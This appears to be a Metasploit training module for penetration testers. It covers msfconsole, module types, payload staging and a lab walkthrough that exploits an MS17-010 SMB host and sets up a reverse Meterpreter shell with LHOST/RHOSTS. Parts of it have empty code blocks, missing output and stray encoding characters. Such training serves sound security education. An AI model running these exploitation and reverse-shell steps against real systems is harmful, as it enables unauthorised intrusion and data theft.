### Module Summary

This module introduces the fundamentals of the Metasploit Framework with a retrospective analysis of the usage of automated tools in today's penetration testing environments. Despite the industry debates revolving around the level of security knowledge needed to operate a swiss army knife type tool such as Metasploit, frameworks such as this allow for in-depth exploration and auditing for which one might not have the necessary time given different circumstances. In this module, we will cover:

-   A preface about using tools
-   An overview of the Metasploit Framework
-   Metasploit module types
-   Setting targets and payloads
-   Pivoting between sessions and jobs
-   Importing new modules
-   Creating a custom payload
-   Creating a custom module
-   Using Meterpreter and Kiwi

This module is broken down into sections with accompanying hands-on exercises to practice each of the tactics and techniques we cover. The module ends with a practical hands-on skills assessment to gauge your understanding of the various topic areas.

As you work through the module, you will see example commands and command output for the various topics introduced. It is worth reproducing as many of these examples as possible to reinforce further the concepts presented in each section. You can do this in the Pwnbox provided in the interactive sections or your virtual machine.

You can start and stop the module at any time and pick up where you left off. There is no time limit or "grading," but you must complete all of the exercises and the skills assessment to receive the maximum number of cubes and have this module marked as complete in any paths you have chosen.

The module is classified as "Easy" but assumes a working knowledge of the Linux command line and an understanding of information security fundamentals.

A firm grasp of the following modules can be considered prerequisites for successful completion of this module:

-   Networking Fundamentals
-   Linux Fundamentals
-   Web Requests
-   Network Enumeration with Nmap
-   Getting Started

# Introduction

## Preface

* * * * *

Tools have recently seen heated debates within the security industry's social media circles. Some discussions revolved around the personal preference of some groups, while others aimed towards the evaluation of tool disclosure policies to the public. Nevertheless, there is a need to point out the importance of automated tools in the industry today.

The general opinion we have indeed heard or will hear is that using automated tools during a security assessment is not the right choice. This is because they offer the security analyst or penetration tester no chance to 'prove' themselves when interacting with a vulnerable environment. Furthermore, many say that tools make the job too easy for the auditor to receive any recognition for their assessment.

Another vocal group disagrees - those consisting of newer members of the infosec community, who are just starting and making their first steps, and those who sustain the argument that tools help us learn better by offering us a more user-friendly approach to the plethora of vulnerabilities that exist in the wild while saving us time for the more intricate parts of an assessment. We will also be taking this confrontational approach to the issue.

Tools can indeed, in some cases, present us with some downsides:

-   Create a comfort zone that will be hard to break out of to learn new skills

-   Create a security risk just because they are published online for everyone to see and use

-   Create a tunnel vision effect.¬†`If the tool cannot do it, neither can I.`

Like in other industries where the creative part of the work can be combined with automated tasks, tools can limit our view and actions as new users. We can mistakenly¬†`learn`¬†that they provide the solutions to all problems, and we start to rely on them more and more. This, in turn, creates a tunnel vision effect that can and will limit the possible interactions that the user might think about and act upon for their assessment.

At the same time, the fact that more and more of these automated tools make their way into the public sector (see the NSA release of security tools to the public) creates more possibilities for would-be malicious actors with little to no knowledge of the industry to act upon their desires to make a quick profit or flaunt their endeavors inside dark rooms filled with smaller people.

* * * * *

### Discipline
----------

If there are any discerning factors to be drawn from the current state of the information security industry, they are to be drawn on the premise that we are in a continuous, accelerated evolution of existing technologies, protocols, and systems. With the cumulus of environment variables that we encounter during an assessment, time must be saved where it can, and a strong security paradigm is formed for the auditor. Discipline is critical in all fields of work, and the conclusions are as follows:

>We will never have enough time to complete the assessment. With the number of technologies in use in every single environment variation, we will not be offered the time to do a complete, comprehensive assessment. Time is money, and we are on the clock for a non-tech-savvy customer, and we need to complete the bulk of the work first: the issues with the most potential impact and highest remediation turnover.

>Credibility can be an issue even if we make our tools or manually exploit every service. We are not competing against other industry members but rather against pre-set economic conditions and personal beliefs from the customer management level. They would not comprehend or give much importance to accolades. They just want the work done in the highest possible quantity, in the least amount of time.

>You only have to impress yourself, not the infosec community. If we achieve the first, the latter will come naturally. Using the same example as above, many artists with an online presence stray from their original goals in pursuit of online validation. Their art becomes stale and generic to the keen eye, but to the everyday user, it contains the wanted visual elements and themes, not those their followers do not yet know they want. As security researchers or penetration testers, we only must validate vulnerabilities, not validate our ego.

* * * * *

### Conclusion
----------

We have to analyze and know our tools inside and out to keep our tracks covered and avoid a cataclysmic event during our assessment. Many tools can prove to be unpredictable. Some can leave traces of activity on the target system, and some may leave our attacker platform with open gates. Nevertheless, as long as we follow the rules here, they can be a valuable educational platform for beginners and a needed time-saver mechanism for professionals.

Do not get tunnel vision. Use the tool as a tool, not as a backbone or life support for our complete assessment.

Please read all the technical documentation you can find for any of our tools. Please get to know them intimately. Leave no stone (or function or class) unturned. This will help us avoid unintended behaviors or an irate customer and a team of lawyers.

Suppose we audit our tools and set ourselves up with a solid methodology for preliminary checks and attack paths. In that case, tools will save us time for further research and a long-lasting concrete exploration of our security research paradigm. Considering the accelerated pace at which more and more technologies appear in today's environments, this further research should focus on a deeper understanding of security mechanisms, furthering our audit towards more abstract security objects on broadening the spectrum under which the analysis is made. This is how we evolve as a professional.

## Introduction to Metasploit

* * * * *

The¬†`Metasploit Project`¬†is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The¬†`Metasploit Framework`¬†includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the¬†`Metasploit Project`¬†is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.

![[S02_SS01.png]]

The¬†`modules`¬†mentioned are actual exploit proof-of-concepts that have already been developed and tested in the wild and integrated within the framework to provide pentesters with ease of access to different attack vectors for different platforms and services. Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get us through the most common unpatched vulnerabilities.

Its strong suit is that it provides a plethora of available targets and versions, all a few commands away from a successful foothold. These, combined with an exploit tailor-made to those vulnerable versions and with a payload that is sent after the exploit, which will give us actual access into the system, provide us with an easy, automated way to switch between target connections during our post-exploitation ventures.

* * * * *

### Metasploit Pro
--------------

`Metasploit`¬†as a product is split into two versions. The¬†`Metasploit Pro`¬†version is different from the¬†`Metasploit Framework`¬†one with some additional features:

-   Task Chains
-   Social Engineering
-   Vulnerability Validations
-   GUI
-   Quick Start Wizards
-   Nexpose Integration

If you're more of a command-line user and prefer the extra features, the Pro version also contains its own console, much like¬†`msfconsole`.

To have a general idea of what Metasploit Pro's newest features can achieve, check out the list below:

| Infiltrate | Collect Data | Remediate |
| --- | --- | --- |
| Manual Exploitation | Import and Scan Data | Bruteforce |
| Anti-virus Evasion | Discovery Scans | Task Chains |
| IPS/IDS Evasion | Meta-Modules | Exploitation Workflow |
| Proxy Pivot | Nexpose Scan Integration | Session Rerun |
| Post-Exploitation |  | Task Replay |
| Session Clean-up |  | Project Sonar Integration |
| Credentials Reuse |  | Session Management |
| Social Engineering |  | Credential Management |
| Payload Generator |  | Team Collaboration |
| Quick Pen-testing |  | Web Interface |
| VPN Pivoting |  | Backup and Restore |
| Vulnerability Validation |  | Data Export |
| Phishing Wizard |  | Evidence Collection |
| Web App Testing |  | Reporting |
| Persistent Sessions |  | Tagging Data |

* * * * *

### Metasploit Framework Console
----------------------------

The¬†`msfconsole`¬†is probably the most popular interface to the¬†`Metasploit Framework`¬†`(MSF)`. It provides an "all-in-one" centralized console and allows you efficient access to virtually all options available in the¬†`MSF`.¬†`Msfconsole`¬†may seem intimidating at first, but once you learn the syntax of the commands, you will learn to appreciate the power of utilizing this interface.

The features that¬†`msfconsole`¬†generally brings are the following:

-   It is the only supported way to access most of the features within¬†`Metasploit`

-   Provides a console-based interface to the¬†`Framework`

-   Contains the most features and is the most stable¬†`MSF`¬†interface

-   Full readline support, tabbing, and command completion

-   Execution of external commands in¬†`msfconsole`

Both products mentioned above come with an extensive database of available modules to use in our assessments. These, combined with the use of external commands such as scanners, social engineering toolkits, and payload generators, can turn our setup into a ready-to-strike machine that will allow us to seamlessly control and manipulate different vulnerabilities in the wild with the use of sessions and jobs in the same way we would see tabs on an Internet browser.

The key term here is usability---user experience. The ease with which we can control the console can improve our learning experience. Therefore, let us delve into the specifics.

* * * * *

### Understanding the Architecture
------------------------------

To fully operate whatever tool we are using, we must first look under its hood. It is good practice, and it can offer us better insight into what will be going on during our security assessments when that tool comes into play. It is essential not to have¬†[any wildcards that might leave you or your client exposed to data breaches](https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/).

By default, all the base files related to Metasploit Framework can be found under¬†`/usr/share/metasploit-framework`¬†in our¬†`ParrotOS Security`¬†distro.

#### Data, Documentation, Lib

These are the base files for the Framework. The Data and Lib are the functioning parts of the msfconsole interface, while the Documentation folder contains all the technical details about the project.

#### Modules

The Modules detailed above are split into separate categories in this folder. We will go into detail about these in the next sections. They are contained in the following folders:

	ls /usr/share/metasploit-framework/modules

```text
auxiliary  encoders  evasion  exploits  nops  payloads  post
```

#### Plugins

Plugins offer the pentester more flexibility when using the¬†`msfconsole`¬†since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.

	ls /usr/share/metasploit-framework/plugins/

```text
aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
auto_add_route.rb  lab.rb         request.rb           thread.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
```

#### Scripts

Meterpreter functionality and other useful scripts.

	ls /usr/share/metasploit-framework/scripts/

```text
meterpreter  ps  resource  shell
```

#### Tools

Command-line utilities that can be called directly from the¬†`msfconsole`¬†menu.

	ls /usr/share/metasploit-framework/tools/

```text
context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
```

Now that we know all of these locations, it will be easy for us to reference them in the future when we decide to import new modules or even create new ones from scratch.

#### Questions

>Which version of Metasploit comes equipped with a GUI interface?

>Which version of Metasploit is free and can be used only through a CLI?

## Introduction to MSFconsole

* * * * *

To start interacting with the Metasploit Framework, we need to type¬†`msfconsole`¬†in the terminal of our choice. Many security-oriented distributions such as Parrot Security and Kali Linux come with¬†`msfconsole`¬†preinstalled. We can use several other options when launching the script as with any other command-line tool. These vary from graphical display switches/options to procedural ones.

* * * * *

### Preparation
-----------

Upon launching the¬†`msfconsole`, we are met with their coined splash art and the command line prompt, waiting for our first command.

#### Launching MSFconsole

	msfconsole

Metasploit tip: Use sessions -1 to interact with the last opened session

msf6 > 
```

Alternatively, we can use the¬†`-q`¬†option, which does not display the banner.

	msfconsole -q

```text
msf6 > 
```

To better look at all the available commands, we can type the¬†`help`¬†command. First things first, our tools need to be sharp. One of the first things we need to do is make sure the modules that compose the framework are up to date, and any new ones available to the public can be imported.

The old way would have been to run¬†`msfupdate`¬†in our OS terminal (outside¬†`msfconsole`). However, the¬†`apt`¬†package manager can currently handle the update of modules and features effortlessly.

#### Installing MSF

	sudo apt update && sudo apt install metasploit-framework

```text
<SNIP>

(Reading database ... 414458 files and directories currently installed.)

```

One of the first steps we will cover in this module is searching for a proper¬†`exploit`¬†for our¬†`target`. Nevertheless, we need to have a detailed perspective on the¬†`target`¬†itself before attempting any exploitation. This involves the¬†`Enumeration`¬†process, which precedes any type of exploitation attempt.

During¬†`Enumeration`, we have to look at our target and identify which public-facing services are running on it. For example, is it an HTTP server? Is it an FTP server? Is it an SQL Database? These different¬†`target`¬†typologies vary substantially in the real world. We will need to start with a thorough¬†`scan`¬†of the target's IP address to determine what service is running and what version is installed for each service.

We will notice as we go along that versions are the key components during the¬†`Enumeration`¬†process that will allow us to determine if the target is vulnerable or not. Unpatched versions of previously vulnerable services or outdated code in a publicly accessible platform will often be our entry point into the¬†`target`¬†system.

* * * * *

### MSF Engagement Structure
------------------------

The MSF engagement structure can be divided into five main categories.

-   Enumeration
-   Preparation
-   Exploitation
-   Privilege Escalation
-   Post-Exploitation

This division makes it easier for us to find and select the appropriate MSF features in a more structured way and to work with them accordingly. Each of these categories has different subcategories that are intended for specific purposes. These include, for example, Service Validation and Vulnerability Research.

It is therefore crucial that we familiarize ourselves with this structure. Therefore, we will look at this framework's components to better understand how they are related.

![[S04_SS03.png]]

We will go through each of these categories during the module, but we recommend looking at the individual components ourselves and digging deeper. Experimenting with the different functions is an integral part of learning a new tool or skill. Therefore, we should try out everything imaginable here in the following labs and analyze the results independently.

# MSF Components

## Modules

* * * * *

As we mentioned previously, Metasploit¬†`modules`¬†are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. The¬†`exploit`¬†category consists of so-called proof-of-concept (`POCs`) that can be used to exploit existing vulnerabilities in a largely automated manner. Many people often think that the failure of the exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and not that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for our manual skills.

Once we are in the¬†`msfconsole`, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:

#### Syntax

```text
<No.> <type>/<os>/<service>/<name>
```

#### Example

```text
794   exploit/windows/ftp/scriptftp_list
```

#### Index No.

The¬†`No.`¬†tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the¬†`No.`¬†tag can be to select specific Metasploit modules later.

#### Type

The¬†`Type`¬†tag is the first level of segregation between the Metasploit¬†`modules`. Looking at this field, we can tell what the piece of code for this module will accomplish. Some of these¬†`types`¬†are not directly usable as an¬†`exploit`¬†module would be, for example. However, they are set to introduce the structure alongside the interactable ones for better modularization. To explain better, here are the possible types that could appear in this field:

| Type | Description |
| --- | --- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| `Encoders` | Ensure that payloads are intact to their destination. |
| `Exploits` | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| `NOPs` | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
| `Payloads` | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins` | Additional scripts can be integrated within an assessment with¬†`msfconsole`¬†and coexist. |
| `Post` | Wide array of modules to gather information, pivot deeper, etc. |

Note that when selecting a module to use for payload delivery, the¬†`use <no.>`¬†command can only be used with the following modules that can be used as¬†`initiators`¬†(or interactable modules):

| Type | Description |
| --- | --- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| `Exploits` | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| `Post` | Wide array of modules to gather information, pivot deeper, etc. |

#### OS

The¬†`OS`¬†tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

#### Service

The¬†`Service`¬†tag refers to the vulnerable service that is running on the target machine. For some modules, such as the¬†`auxiliary`¬†or¬†`post`¬†ones, this tag can refer to a more general activity such as¬†`gather`, referring to the gathering of credentials, for example.

#### Name

Finally, the¬†`Name`¬†tag explains the actual action that can be performed using this module created for a specific purpose.

* * * * *

### Searching for Modules
---------------------

Metasploit also offers a well-developed search function for the existing modules. With the help of this function, we can quickly search through all the modules using specific¬†`tags`¬†to find a suitable one for our target.

#### MSF - Search Function

	help search

```text

  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

For example, we can try to find the¬†`EternalRomance`¬†exploit for older Windows operating systems. This could look something like this:

* * * * *

```

We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (`cve:<year>`), the platform Windows (`platform:<os>`), the type of module we want to find (`type:<auxiliary/exploit/post>`), the reliability rank (`rank:<rank>`), and the search name (`<pattern>`). This would reduce our results to only those that match all of the above.

```

* * * * *

### Module Selection
----------------

To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.

	nmap -sV 10.10.10.40

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
```

We would boot up¬†`msfconsole`¬†and search for this exact exploit name.

#### MSF - Search for MS17_010

	search ms17_010

```text

================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

Next, we want to select the appropriate module for this scenario. From the¬†`Nmap`¬†scan, we have detected the SMB service running on version¬†`Microsoft Windows 7 - 10`. With some additional OS scanning, we can guess that this is a Windows 7 running a vulnerable instance of SMB. We then proceed to select the module with the¬†`index no. 2`¬†to test if the target is vulnerable.

* * * * *

### Using Modules
-------------

Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the¬†`show options`¬†command. Everything required to be set before the exploitation can occur will have a¬†`Yes`¬†under the¬†`Required`¬†column.

Here we see how helpful the¬†`No.`¬†tags can be. Because now, we do not have to type the whole path but only the number assigned to the Metasploit module in our search. We can use the command¬†`info`¬†after selecting the module if we want to know something more about the module. This will give us a series of information that can be important for us.

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSynergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (`RHOST`¬†or¬†`RHOSTS`).

In addition, there is the option¬†`setg`, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.

This has been a quick and dirty example of how¬†`msfconsole`¬†can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any¬†`payload`¬†selection,¬†`encoding`¬†or¬†`pivoting`¬†between sessions or jobs.

#### Questions

>Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

## Targets

* * * * *

`Targets`¬†are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system. The¬†`show targets`¬†command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let us know that we need to select an exploit module first.

#### MSF - Show Targets

	show targets

### Selecting a Target
------------------

We can see that there is only one general type of target set for this type of exploit. What if we change the exploit module to something that needs more specific target ranges? The following exploit is aimed at:

-   `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`.

If we want to find out more about this specific module and what the vulnerability behind it does, we can use the¬†`info`¬†command. This command can help us out whenever we are unsure about the origins or functionality of different exploits or auxiliary modules. Keeping in mind that it is always considered best practice to audit our code for any artifact generation or 'additional features', the¬†`info`¬†command should be one of the first steps we take when using a new module. This way, we can familiarize ourselves with the exploit functionality while assuring a safe, clean working environment for both our clients and us.

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition. Please note that this vulnerability has 
  been exploited since Sep 14, 2012. Also, note that 
  presently, this module has some target dependencies for the ROP 
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
  JRE 1.6.x or below must be installed (which is often the case).

Looking at the description, we can get a general idea of what this exploit will accomplish for us. Keeping this in mind, we would next want to check which versions are vulnerable to this exploit.

### Target Types
------------

There is a large variety of target types. Every target can vary from another by service pack, OS version, and even language version. It all depends on the return address and other parameters in the target or within the exploit module.

The return address can vary because a particular language pack changes addresses, a different software version is available, or the addresses are shifted due to hooks. It is all determined by the type of return address required to identify the target. This address can be¬†`jmp esp`, a jump to a specific register that identifies the target, or a¬†`pop/pop/ret`. For more on the topic of return addresses, see the¬†[Stack-Based Buffer Overflows on Windows x86](https://academy.hackthebox.com/module/89/section/931)¬†module. Comments in the exploit module's code can help us determine what the target is defined by.

To identify a target correctly, we will need to:

-   Obtain a copy of the target binaries
-   Use msfpescan to locate a suitable return address

Later in the module, we will be delving deeper into exploit development, payload generation, and target identification.

## Payloads

* * * * *

A¬†`Payload`¬†in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (`exploits job`) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (`payload's job`).

There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages. Using three typologies of payload interaction will prove beneficial to the pentester. It can offer the flexibility we need to perform certain types of tasks. Whether or not a payload is staged is represented by¬†`/`¬†in the payload name.

For example,¬†`windows/shell_bind_tcp`¬†is a single payload with no stage, whereas¬†`windows/shell/bind_tcp`¬†consists of a stager (`bind_tcp`) and a stage (`shell`).

#### Singles

A¬†`Single`¬†payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.¬†`Singles`¬†are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.

#### Stagers

`Stager`¬†payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host.¬†`Stagers`¬†are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.

Windows NX vs. NO-NX Stagers

-   Reliability issue for NX CPUs and DEP
-   NX stagers are bigger (VirtualAlloc memory)
-   Default is now NX + Win7 compatible

#### Stages

`Stages`¬†are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:

-   A single¬†`recv()`¬†fails with large payloads
-   The Stager receives the middle stager
-   The middle Stager then performs a full download
-   Also better for RWX

* * * * *

### Staged Payloads
---------------

A staged payload is, simply put, an¬†`exploitation process`¬†that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.

The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (`AV`) / Intrusion Prevention System (`IPS`) evasion as much as possible.

`Stage0`¬†of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine. This is what is known as a reverse connection. As a Metasploit user, we will meet these under the common names¬†`reverse_tcp`,¬†`reverse_https`, and¬†`bind_tcp`. For example, under the¬†`show payloads`¬†command, you can look for the payloads that look like the following:

```

Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a¬†`security trust zone`. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.

Stage0 code also aims to read a larger, subsequent payload into memory once it arrives. After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access. This larger payload would be the¬†`Stage1`¬†payload. We will go into more detail in the later sections.

#### Meterpreter Payload

The¬†`Meterpreter`¬†payload is a specific type of multi-faceted payload that uses¬†`DLL injection`¬†to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be¬†`loaded and unloaded`¬†dynamically as required.

Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has "infected." It offers us a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens. We will delve into more detail about Meterpreter in a later section.

Using Meterpreter, we can also¬†`load`¬†in different Plugins to assist us with our assessment. We will talk more about these in the Plugins section of this module.

* * * * *

### Searching for Payloads
----------------------

To select our first payload, we need to know what we want to do on the target machine. For example, if we are going for access persistence, we will probably want to select a Meterpreter payload.

As mentioned above, Meterpreter payloads offer us a significant amount of flexibility. Their base functionality is already vast and influential. We can automate and quickly deliver combined with plugins such as¬†[GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz)¬†parts of the pentest while keeping an organized, time-effective assessment. To see all of the available payloads, use the¬†`show payloads`¬†command in¬†`msfconsole`.

As seen above, there are a lot of available payloads to choose from. Not only that, but we can create our payloads using¬†`msfvenom`, but we will dive into that a little bit later. We will use the same target as before, and instead of using the default payload, which is a simple¬†`reverse_tcp_shell`, we will be using a¬†`Meterpreter Payload for Windows 7(x64)`.

Scrolling through the list above, we find the section containing¬†`Meterpreter Payloads for Windows(x64)`.

```

As we can see, it can be pretty time-consuming to find the desired payload with such an extensive list. We can also use¬†`grep`¬†in¬†`msfconsole`¬†to filter out specific terms. This would speed up the search and, therefore, our selection.

We have to enter the¬†`grep`¬†command with the corresponding parameter at the beginning and then the command in which the filtering should happen. For example, let us assume that we want to have a¬†`TCP`¬†based¬†`reverse shell`¬†handled by¬†`Meterpreter`¬†for our exploit. Accordingly, we can first search for all results that contain the word¬†`Meterpreter`¬†in the payloads.

	grep -c meterpreter show payloads

```text

```

This gives us a total of¬†`14`¬†results. Now we can add another¬†`grep`¬†command after the first one and search for¬†`reverse_tcp`.

	grep meterpreter grep reverse_tcp show payloads

```text
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager

```

	grep -c meterpreter grep reverse_tcp show payloads

```text
[*] 3
```

With the help of¬†`grep`, we reduced the list of payloads we wanted down to fewer. Of course, the¬†`grep`¬†command can be used for all other commands. All we need to know is what we are looking for.

* * * * *

### Selecting Payloads
------------------

Same as with the module, we need the index number of the entry we would like to use. To set the payload for the currently selected module, we use¬†`set payload <no.>`¬†only after selecting an Exploit module to begin with.

As we can see, by running the¬†`show payloads`¬†command within the Exploit module itself, msfconsole has detected that the target is a Windows machine, and such only displayed the payloads aimed at Windows operating systems.

We can also see that a new option field has appeared, directly related to what the payload parameters will contain. We will be focusing on¬†`LHOST`¬†and¬†`LPORT`¬†(our attacker IP and the desired port for reverse connection initialization). Of course, if the attack fails, we can always use a different port and relaunch the attack.

* * * * *

### Using Payloads
--------------

Time to set our parameters for both the Exploit module and the payload module. For the Exploit part, we will need to set the following:

| Parameter | Description |
| --- | --- |
| `RHOSTS` | The IP address of the remote host, the target machine. |
| `RPORT` | Does not require a change, just a check that we are on port 445, where SMB is running. |

For the payload part, we will need to set the following:

| Parameter | Description |
| --- | --- |
| `LHOST` | The host's IP address, the attacker's machine. |
| `LPORT` | Does not require a change, just a check that the port is not already in use. |

If we want to check our LHOST IP address quickly, we can always call the¬†`ifconfig`¬†command directly from the msfconsole menu.

#### MSF - Exploit and Payload Configuration

	ifconfig

```text
**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>
```

	set LHOST 10.10.14.15

```text
LHOST => 10.10.14.15
```

	set RHOSTS 10.10.10.40

```text
RHOSTS => 10.10.10.40
```

Then, we can run the exploit and see what it returns. Check out the differences in the output below:

	whoami

```text

	getuid

```

The prompt is not a Windows command-line one but a¬†`Meterpreter`¬†prompt. The¬†`whoami`¬†command, typically used for Windows, does not work here. Instead, we can use the Linux equivalent of¬†`getuid`. Exploring the¬†`help`¬†menu gives us further insight into what Meterpreter payloads are capable of.

`Channel 1`¬†has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage. The stager was activated on our machine to await a connection request initialized by the Stage payload on the target machine.

Moving into a standard shell on the target is helpful in some cases, but Meterpreter can also navigate and perform actions on the victim machine. So we see that the commands have changed, but we have the same privilege level within the system.

Let's see what other types of payloads we can use. We will be looking at the most common ones related to Windows operating systems.

* * * * *

### Payload Types
-------------

The table below contains the most common payloads used for Windows machines and their respective descriptions.

| Payload | Description |
| --- | --- |
| `generic/custom` | Generic listener, multi-use |
| `generic/shell_bind_tcp` | Generic listener, multi-use, normal shell, TCP connection binding |
| `generic/shell_reverse_tcp` | Generic listener, multi-use, normal shell, reverse TCP connection |
| `windows/x64/exec` | Executes an arbitrary command (Windows x64) |
| `windows/x64/loadlibrary` | Loads an arbitrary x64 library path |
| `windows/x64/messagebox` | Spawns a dialog via MessageBox using a customizable title, text & icon |
| `windows/x64/shell_reverse_tcp` | Normal shell, single payload, reverse TCP connection |
| `windows/x64/shell/reverse_tcp` | Normal shell, stager + stage, reverse TCP connection |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager |
| `windows/x64/meterpreter/$` | Meterpreter payload + varieties above |
| `windows/x64/powershell/$` | Interactive PowerShell sessions + varieties above |
| `windows/x64/vncinject/$` | VNC Server (Reflective Injection) + varieties above |

Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads. These are not in the scope of this course, but feel free to research them in our free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.

